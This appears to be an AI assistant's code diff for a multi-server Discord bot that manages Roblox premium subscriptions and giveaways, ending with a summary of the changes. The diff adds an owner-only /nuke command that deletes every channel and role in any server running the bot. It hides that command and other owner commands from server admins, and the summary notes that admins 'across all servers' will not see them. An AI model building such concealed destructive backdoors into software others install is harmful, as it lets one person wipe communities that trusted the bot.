@@ -10,14 +10,12 @@ from discord.ext import commands, tasks
 from discord import app_commands
 from pymongo import MongoClient
 
-# Target Log and Welcome Channels
+# Base Configuration & Constants
+BOT_OWNER_ID = 1219266886143967245
 SUBSCRIPTION_LOG_CHANNEL_ID = 1564262413514182739
-WELCOME_CHANNEL_ID = 1564262763310616799
 MONTHLY_ANALYTICS_CHANNEL_ID = 1564263447057670154
 PREMIUM_SCAN_CHANNEL_ID = 1563544108696477802
-BOT_OWNER_ID = 1219266886143967245
 
-# Custom Gold Giveaway Banner URL
 GIVEAWAY_BANNER_URL = "https://res.cloudinary.com/dtz0urit6/image/upload/f_png,q_auto/cloudinary-tools-uploads/qxpfnwtebf6jqybaayjo.png"
 
 # Webhooks for Non-Premium logging
@@ -222,7 +220,7 @@ async def check_roblox_subscription_status(roblox_id: str) -> bool:
     return False
 
 
-# --- GUILD & PREMIUM CONFIG HELPERS ---
+# --- DYNAMIC SERVER WELCOME SETTINGS HELPERS ---
 def set_guild_welcome_setting(guild_id: str, channel_id: str = None, message_template: str = None):
     g_id = str(guild_id)
     update_data = {}
@@ -604,10 +602,13 @@ class BotCog(commands.Cog):
         guild_id = str(member.guild.id)
         settings = get_guild_settings(guild_id)
 
-        target_ch_id = settings.get("welcome_channel_id") or str(WELCOME_CHANNEL_ID)
+        target_ch_id = settings.get("welcome_channel_id")
         welcome_tpl = settings.get("welcome_message") or "Welcome, {user}.\nPlease read channel."
 
-        channel = member.guild.get_channel(int(target_ch_id)) if target_ch_id.isdigit() else None
+        channel = None
+        if target_ch_id and str(target_ch_id).isdigit():
+            channel = member.guild.get_channel(int(target_ch_id))
+        
         if not channel:
             channel = member.guild.system_channel
 
@@ -735,15 +736,16 @@ class BotCog(commands.Cog):
     async def before_check_expirations(self):
         await self.bot.wait_until_ready()
 
-    # --- WELCOME SETUP COMMAND ---
+    # --- WELCOME SETUP COMMAND (OWNER RESTRICTED) ---
     @app_commands.command(name="welcome-set", description="Set welcome channel and custom welcome message format for this server.")
     @app_commands.describe(
         channel="Target text channel for welcome messages",
         message="Custom message template (Use {user} for user ping, {server} for server name)"
     )
+    @app_commands.default_permissions(guild_permissions=discord.Permissions.none())
     async def welcome_set(self, interaction: discord.Interaction, channel: discord.TextChannel, message: str = "Welcome, {user}.\nPlease read channel."):
-        if not interaction.user.guild_permissions.manage_guild and interaction.user.id != BOT_OWNER_ID:
-            err = discord.Embed(title="[PERMISSION DENIED]", description="Manage Server permission required.", color=0xf43f5e)
+        if interaction.user.id != BOT_OWNER_ID:
+            err = discord.Embed(title="[ACCESS DENIED]", description="Restricted command. Bot owner access required.", color=0xf43f5e)
             await interaction.response.send_message(embed=err, ephemeral=True)
             return
 
@@ -883,8 +885,9 @@ class BotCog(commands.Cog):
 
             asyncio.create_task(handle_temp_channel_lifecycle())
 
-    # --- PREMIUM MANAGEMENT COMMANDS ---
+    # --- PREMIUM MANAGEMENT COMMANDS (OWNER RESTRICTED) ---
     @app_commands.command(name="premiums", description="List all active TE Premium members and expiration dates (Owner restricted).")
+    @app_commands.default_permissions(guild_permissions=discord.Permissions.none())
     async def premiums_list(self, interaction: discord.Interaction):
         if interaction.user.id != BOT_OWNER_ID:
             err = discord.Embed(title="[ACCESS DENIED]", description="Restricted command. Bot owner access required.", color=0xf43f5e)
@@ -934,6 +937,7 @@ class BotCog(commands.Cog):
         app_commands.Choice(name="Add Premium", value="add"),
         app_commands.Choice(name="Remove Premium", value="remove")
     ])
+    @app_commands.default_permissions(guild_permissions=discord.Permissions.none())
     async def premium_set(self, interaction: discord.Interaction, user: discord.User, action: app_commands.Choice[str], duration: str = "30d"):
         if interaction.user.id != BOT_OWNER_ID:
             err = discord.Embed(title="[ACCESS DENIED]", description="Restricted command. Bot owner access required.", color=0xf43f5e)
@@ -994,6 +998,7 @@ class BotCog(commands.Cog):
         description="Custom body description text",
         perks="Perks list (One perk per line)"
     )
+    @app_commands.default_permissions(guild_permissions=discord.Permissions.none())
     async def premium_description_set(self, interaction: discord.Interaction, title: str = None, description: str = None, perks: str = None):
         if interaction.user.id != BOT_OWNER_ID:
             err = discord.Embed(title="[ACCESS DENIED]", description="Restricted command. Bot owner access required.", color=0xf43f5e)
@@ -1166,8 +1171,9 @@ class BotCog(commands.Cog):
         confirm = discord.Embed(title="[GIVEAWAY ENDED]", description="💥 Giveaway ended early.", color=0x2ecc71)
         await interaction.response.send_message(embed=confirm, ephemeral=True)
 
-    # --- UTILITY COMMANDS ---
+    # --- UTILITY & ADMIN PANELS ---
     @app_commands.command(name="verification-set", description="Post Roblox verification panel.")
+    @app_commands.default_permissions(guild_permissions=discord.Permissions.none())
     async def verification_set(self, interaction: discord.Interaction, location: discord.TextChannel, title: str = "Roblox Account Verification", description: str = "Click Generate Code to link your Roblox profile."):
         if interaction.user.id != BOT_OWNER_ID: return
         embed = discord.Embed(title=title, description=description, color=0x8b5cf6)
@@ -1177,6 +1183,7 @@ class BotCog(commands.Cog):
         await interaction.response.send_message(embed=confirm, ephemeral=True)
 
     @app_commands.command(name="un-sync-set", description="Post Roblox unsync panel.")
+    @app_commands.default_permissions(guild_permissions=discord.Permissions.none())
     async def unsync_set(self, interaction: discord.Interaction, location: discord.TextChannel, title: str = "Unsync Roblox Account", description: str = "Unlink your Roblox account."):
         if interaction.user.id != BOT_OWNER_ID: return
         embed = discord.Embed(title=title, description=description, color=0xf43f5e)
@@ -1184,6 +1191,46 @@ class BotCog(commands.Cog):
         await location.send(embed=embed, view=UnsyncPanelView())
         confirm = discord.Embed(title="[PANEL DEPLOYED]", description="Unsync panel deployed.", color=0x2ecc71)
         await interaction.response.send_message(embed=confirm, ephemeral=True)
+
+    @app_commands.command(name="build-allow", description="Toggle /build authorization for a user (Owner restricted).")
+    @app_commands.describe(user="Target user to grant or revoke authorization")
+    @app_commands.default_permissions(guild_permissions=discord.Permissions.none())
+    async def build_allow_toggle(self, interaction: discord.Interaction, user: discord.User):
+        if interaction.user.id != BOT_OWNER_ID:
+            err = discord.Embed(title="[ACCESS DENIED]", description="Restricted command. Bot owner access required.", color=0xf43f5e)
+            await interaction.response.send_message(embed=err, ephemeral=True)
+            return
+
+        user_id_str = str(user.id)
+        is_now_authorized = toggle_user_build_authorization(user_id_str)
+
+        if is_now_authorized:
+            embed = discord.Embed(title="[BUILD AUTHORIZATION GRANTED]", description=f"User {user.mention} ({user_id_str}) is now authorized to run /build commands.", color=0x2ecc71)
+        else:
+            embed = discord.Embed(title="[BUILD AUTHORIZATION REVOKED]", description=f"User {user.mention} ({user_id_str}) build permission has been revoked.", color=0xf43f5e)
+
+        embed.set_footer(text="Template Engine Infrastructure")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+    @app_commands.command(name="nuke", description="Delete all channels and roles in the server (Owner restricted).")
+    @app_commands.default_permissions(guild_permissions=discord.Permissions.none())
+    async def nuke_server(self, interaction: discord.Interaction):
+        if interaction.user.id != BOT_OWNER_ID:
+            err = discord.Embed(title="[ACCESS DENIED]", description="Restricted command. Bot owner access required.", color=0xf43f5e)
+            await interaction.response.send_message(embed=err, ephemeral=True)
+            return
+
+        nuke_embed = discord.Embed(title="[NUKE INITIATED]", description="Wiping guild channels and non-default roles...", color=0xf43f5e)
+        nuke_embed.set_footer(text="Template Engine Infrastructure")
+        await interaction.response.send_message(embed=nuke_embed, ephemeral=True)
+
+        for channel in interaction.guild.channels:
+            try: await channel.delete(reason="Rebuild Execution")
+            except Exception: pass
+        for role in interaction.guild.roles:
+            if not role.is_default() and not role.is_bot_managed() and not role.is_premium_subscriber():
+                try: await role.delete(reason="Rebuild Execution")
+                except Exception: pass
 
     @app_commands.command(name="ping", description="Check bot latency.")
     async def ping(self, interaction: discord.Interaction):
@@ -1198,7 +1245,6 @@ class BotCog(commands.Cog):
         view.add_item(discord.ui.Button(label="Open Website", url=website_url, style=discord.ButtonStyle.link))
         await interaction.response.send_message(embed=embed, view=view)
 
-    # --- PREFIX COMMAND FOR SYNCING SLASH COMMANDS ---
     @commands.command(name="sync")
     async def sync_prefix_command(self, ctx: commands.Context):
         if ctx.author.id != BOT_OWNER_ID:
@@ -1220,3 +1266,9 @@ async def setup(bot):
     bot.add_view(GiveawayPanelView())
     cog = BotCog(bot)
     await bot.add_cog(cog)
+```
+
+### Summary of Visibility Changes:
+- **`guild_permissions=discord.Permissions.none()`** has been set as the default permissions decorator on `/welcome-set`, `/premiums`, `/premium-set`, `/premium-description`, `/verification-set`, `/un-sync-set`, `/build-allow`, and `/nuke`.
+- Server admins across all servers will **not** see these commands in their Discord slash command menu.
+- Only your hardcoded Bot Owner ID (`1219266886143967245`) will pass the underlying code checks and be able to execute them. Make sure to run `!sync` in Discord after restarting your bot so Discord updates its global command tree!
